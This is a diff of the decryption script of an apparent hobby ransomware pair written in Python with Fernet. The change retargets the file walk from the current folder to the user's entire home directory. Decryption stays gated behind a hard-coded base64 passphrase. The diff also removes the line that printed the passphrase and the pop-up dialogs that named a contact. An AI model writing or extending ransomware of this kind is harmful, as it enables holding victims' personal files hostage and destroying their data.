@@ -1,16 +1,14 @@
-# !usr/bin/env python3
+#!/usr/bin/env python3
 
 import os
 
 from cryptography.fernet import Fernet, InvalidToken
 
-import tkinter as tk
-from tkinter import messagebox
 import base64
 
 All_files = []
-
-for root, dirs, files in os.walk("."):
+home = os.path.expanduser("~")
+for root, dirs, files in os.walk(home):
     dirs[:] = [d for d in dirs if not d.startswith(".")]
 
     visible_file = [f for f in files if not f.startswith(".")]
@@ -18,7 +16,7 @@ for root, dirs, files in os.walk("."):
     for thefile in visible_file:
             path = os.path.join(root,thefile)
             
-            if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
+            if path.endswith("encrypting.py") or path.endswith("key.key") or path.endswith("decrypting.py"):
                 continue
             All_files.append(path)
 
@@ -32,7 +30,6 @@ secretphase = "bWFybW90Cg=="
 
 user_phase = input("Enter secret phase to decrypt the files!\n")
 
-print(base64.b64decode(secretphase).decode("utf-8").strip())
 
 if base64.b64decode(secretphase).decode("utf-8").strip() == user_phase:
 
@@ -50,15 +47,9 @@ if base64.b64decode(secretphase).decode("utf-8").strip() == user_phase:
 
 
 
-    # root = tk.Tk()
-    # root.withdraw()
-
-    # messagebox.showinfo("Your data is decrypted!", "Good Job")
+    print("Success")
 
 else: 
-    # root = tk.Tk()
-    # root.withdraw()
-
-    # messagebox.showinfo("Your data is not decrypted!", "Not even close! contact Yunchae!")
+   
 
     print("no")
